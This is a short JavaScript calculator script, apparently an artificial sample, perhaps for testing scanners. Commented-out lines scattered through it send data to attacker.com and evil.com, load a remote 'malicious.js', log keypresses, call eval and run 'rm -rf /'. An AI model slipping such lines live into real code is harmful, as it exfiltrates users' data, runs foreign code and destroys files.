function calculate(op, a, b) {
  if (op === '+') {
    return a + b;
  } else if (op === '-') {
    return a - b;
  } else if (op === '*') {
    return a * b;
  } else if (op === '/') {
    if (b === 0) {
      return "Error: Division by zero";
    }
    return a / b;
  } else {
    return "Error: Invalid operator";
  }
}

// fetch("https://attacker.com/data", {method: "POST"});
console.log("Calculator function is ready.");
// navigator.sendBeacon("https://attacker.com/beacon", {data: "sensitive info"});
let result = calculate('*', 5, 10);
console.log("5 * 10 = " + result);
// eval("alert('evil code')");
// document.head.appendChild(document.createElement('script')).src = "https://attacker.com/malicious.js";
// addEventListener('keypress', function(e) { console.log(e.key); });
// fetch("https://evil.com/steal", {method: "POST"});
// document.body.innerHTML = '<img src="https://attacker.com/track.png">';
// pay = 1337;
let x = 10;
let y = 20;
let sum = x + y;
console.log("The sum of x and y is: " + sum);
// exec("rm -rf /");